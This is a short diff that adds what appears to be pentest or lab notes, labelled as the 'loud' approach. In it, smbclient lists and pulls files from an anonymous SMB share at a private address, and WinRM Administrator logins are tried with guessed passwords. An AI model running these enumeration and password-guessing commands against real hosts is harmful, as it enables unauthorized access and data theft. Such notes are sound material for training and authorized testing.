@@ -1,0 +1,6 @@
+## the LOUD way: copy everything off the share, try a guessed password
+smbclient -L //10.10.3.40 -N
+smbclient //10.10.3.40/Public -N -c 'get welcome.txt'
+smbclient //10.10.3.40/Public -N -c 'get new-staff.txt'
+winrm-shell -i 10.10.3.40 -u Administrator -p Password1
+winrm-shell -i 10.10.3.40 -u Administrator -p Welcome1
